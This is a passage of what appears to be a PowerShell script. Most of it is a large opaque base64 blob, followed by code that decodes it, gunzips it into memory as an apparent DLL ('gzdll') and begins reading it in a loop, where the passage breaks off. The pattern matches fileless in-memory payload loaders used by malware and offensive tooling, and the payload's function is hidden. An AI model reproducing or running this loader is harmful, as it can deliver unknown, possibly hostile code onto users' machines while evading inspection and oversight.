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"
            [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream(45000)
            [System.IO.MemoryStream] $gzdll = New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String($PS))
            $gzipStream = New-Object System.IO.Compression.GzipStream $gzdll, ([IO.Compression.CompressionMode]::Decompress)
            try {
                $buffer = New-Object byte[](32000);
                while ($true) 
                {
                    $read = $gzipStream.Read($buffer, 0, 32000)
                    if ($read -le 0) 
                    {
